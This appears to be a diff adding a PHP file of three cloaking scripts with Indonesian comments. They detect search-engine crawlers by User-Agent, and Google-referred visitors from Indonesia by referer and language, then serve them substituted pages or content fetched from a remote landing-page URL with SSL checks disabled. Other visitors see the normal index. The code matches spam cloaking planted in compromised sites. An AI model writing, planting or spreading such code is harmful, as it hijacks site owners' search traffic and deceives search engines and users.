@@ -1,0 +1,154 @@
+<?php
+$bot_user_agents = array(
+    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", "Storebot-Google", "Google-InspectionTool",
+    "GoogleOther", "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", "Google-Extended", "APIs-Google",
+    "AdsBot-Google-Mobile", "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", "Google-Favicon", "Google Favicon",
+    "Googlebot-Favicon", "Google-Site-Verification", "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", "Bingbot",
+    "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebookexternalhit", "ia_archiver",
+    "Alexa Crawler", "AhrefsBot", "Semrushbot"
+);  
+
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+function is_bot($user_agent, $bot_user_agents) {
+    foreach ($bot_user_agents as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function is_mobile($user_agent) {
+    $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
+    foreach ($mobile_agents as $mobile) {
+        if (stripos($user_agent, $mobile) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Combined conditions for including 'landingpage.php'
+if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
+    include 'line.php';
+    exit;
+} else {
+    include 'index_new.php';
+    exit;
+}
+?>	
+
+
+
+<?php
+function is_google_bot() {
+    if (isset($_SERVER['HTTP_USER_AGENT'])) {
+        $user_agent = $_SERVER['HTTP_USER_AGENT'];
+        $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
+        foreach ($google_agents as $agent) {
+            if (stripos($user_agent, $agent) !== false) {
+                return true;
+            }
+        }
+    }
+    return false;
+}
+ 
+function is_from_indonesia_and_google() {
+    if (isset($_SERVER['HTTP_REFERER'])) {
+        $referer = $_SERVER['HTTP_REFERER'];
+        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+        if (strpos($referer, 'google.co.id') !== false || (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'id') !== false)) {
+            return true;
+        }
+    }
+    return false;
+}
+ 
+if (is_google_bot() || is_from_indonesia_and_google()) {
+    include __DIR__ . '/news.php';     
+} else {
+    include('index_new.php');
+    exit;
+}
+?>
+
+
+<?php
+// Fungsi untuk memeriksa apakah user agent adalah bot mesin pencari
+function isSearchEngineBot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
+    }
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|AhrefsBot|TelegramBot|Google-Site-Verification|Google-InspectionTool)/i', $userAgent);
+}
+
+// Fungsi untuk memeriksa apakah referer dari Google
+function isFromGoogle() {
+    if (!isset($_SERVER['HTTP_REFERER'])) {
+        return false;
+    }
+    $referer = $_SERVER['HTTP_REFERER'];
+    return strpos($referer, 'google.com') !== false || 
+           strpos($referer, 'google.co.id') !== false;
+}
+
+// Fungsi alternatif untuk mengambil konten dari URL
+function NuLzFetch($url) {
+    $url = trim($url); // Hilangkan spasi
+    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
+        return "Invalid URL: $url";
+    }
+
+    if (function_exists('file_get_contents')) {
+        $context = stream_context_create(['http' => ['timeout' => 5]]);
+        $fetch = @file_get_contents($url, false, $context);
+        if ($fetch !== false) return $fetch;
+    }
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Hanya untuk dev
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Cloaking Checker/1.0)');
+        $fetch = curl_exec($ch);
+        curl_close($ch);
+        if ($fetch !== false) return $fetch;
+    }
+
+    return "Cannot fetch URL: $url";
+}
+
+// Atur cookie jika belum pernah dikunjungi
+$cookie_expiration = time() + (365 * 86400); // 1 tahun
+if (!isset($_COOKIE['visited'])) {
+    setcookie('visited', '1', $cookie_expiration, "/");
+}
+
+$cache_duration = 86400;
+header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
+header("Pragma: cache");
+header("Content-Type: text/html; charset=utf-8");
+
+$index_home = 'home.php';
+
+$remote_url = 'url lp kalian';
+
+if (isSearchEngineBot()) {
+    $content = NuLzFetch($remote_url);
+    echo $content;
+} elseif (isFromGoogle()) {
+    $content = NuLzFetch($remote_url);
+    echo $content;
+} else {
+    if (file_exists($index_home)) {
+        include($index_home);
+    } 
+}
+?>
